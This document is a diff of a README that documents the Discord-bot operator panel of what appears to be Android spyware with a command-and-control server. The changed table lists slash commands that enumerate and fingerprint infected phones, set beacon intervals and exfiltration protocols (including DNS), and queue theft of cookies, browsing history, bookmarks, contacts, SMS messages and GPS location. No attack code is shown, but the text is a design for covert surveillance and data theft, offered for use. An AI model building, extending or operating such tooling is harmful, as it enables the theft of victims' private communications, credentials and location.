@@ -159,19 +159,19 @@ The Discord bot serves as the **admin panel** for the C2 server. It accepts comm
 
 | Command | Arguments | Description |
 |---|---|---|
-| `/show-devices` | — | Lists all managed devices with emulator (🤖) and root (🔓) badges |
-| `/device-info` | `device` | Full fingerprint: OS, carrier, installed-app count, root/emulator flags |
+| `/show-devices` | — | Embed: all devices, status 🟢/🔴, badges 🤖/🔓, last beacon timestamp |
+| `/device-info` | `device` | Embed: full fingerprint — OS, carrier, installed-app count, last seen |
 | `/set-beacon-interval` | `15` \| `30` \| `60` \| `120` (autocomplete) | Sets the beacon interval (seconds) |
-| `/request-cookies` | — | Shows cached cookies **and** auto-queues a fresh exfiltration for all devices |
-| `/request-history` | `device` (optional, default `*`) | Queues a history exfiltration task |
-| `/request-bookmarks` | `device` (optional, default `*`) | Queues a bookmarks exfiltration task |
-| `/request-contacts` | `device` (optional, default `*`) | Queues a contacts exfiltration task (requires READ_CONTACTS) |
-| `/request-sms` | `device` (optional, default `*`) | Queues an SMS inbox exfiltration task (requires READ_SMS) |
-| `/request-location` | `device` (optional, default `*`) | Returns the last cached GPS fix (no active tracking) |
+| `/request-cookies` | `device` (optional, default `*`) | Embed: cached cookies + queues fresh task; footer shows queue status |
+| `/request-history` | `device` (optional, default `*`) | Embed: cached history (sorted newest→oldest, URL + visits + date) + queues fresh |
+| `/request-bookmarks` | `device` (optional, default `*`) | Embed: cached bookmarks + queues fresh task |
+| `/request-contacts` | `device` (optional, default `*`) | Embed: cached contacts + queues fresh (requires READ_CONTACTS) |
+| `/request-sms` | `device` (optional, default `*`) | Embed: cached SMS + queues fresh (requires READ_SMS) |
+| `/request-location` | `device` (optional, default `*`) | Embed: cached GPS fix + queues fresh poll |
 | `/set-communication-protocol` | `http` \| `https` \| `dns` (autocomplete) | Sets the exfiltration channel protocol |
 | `/queue-task` | `device`, `task_type`, `parameters` (autocomplete) | Queue a task for a device (or `*` for all) |
-| `/pending-tasks` | — | Show pending task counts per device |
-| `/show-results` | — | Show the latest exfiltrated data per task type per device (with history count) |
+| `/pending-tasks` | — | Embed: pending task counts per device |
+| `/show-results` | — | Embed: latest result per task type per device (with history count) |
 
 > Commands use Discord's native slash command system — type `/` in the chat to see all available commands with autocomplete.
 
